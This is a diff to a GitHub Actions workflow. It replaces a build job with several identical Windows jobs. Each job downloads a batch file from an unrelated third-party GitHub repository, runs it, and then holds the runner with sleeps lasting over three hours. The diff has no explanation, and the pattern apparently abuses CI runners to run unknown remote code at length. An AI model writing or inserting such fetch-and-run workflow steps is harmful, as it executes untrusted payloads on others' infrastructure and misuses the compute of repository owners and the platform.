@@ -4,7 +4,107 @@ on:
   workflow_dispatch:
 
 jobs:
-  build:
+  M-1st:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
+         cmd /c time.bat
+
+      - name: A
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+      
+      - name: B
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+
+      - name: C
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  M-2nd:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
+         cmd /c time.bat
+
+      - name: A
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+      
+      - name: B
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+
+      - name: C
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  M-3rd:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
+         cmd /c time.bat
+
+      - name: A
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+      
+      - name: B
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+
+      - name: C
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  M-4th:
+    runs-on: windows-latest
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://github.com/cisipex552/5/raw/main/Time/time.bat" -OutFile "time.bat"
+         cmd /c time.bat
+
+      - name: A
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+      
+      - name: B
+        run: |
+         start-sleep 301
+         start-sleep -s 302
+
+      - name: C
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
+
+  M-5th:
     runs-on: windows-latest
 
     steps:
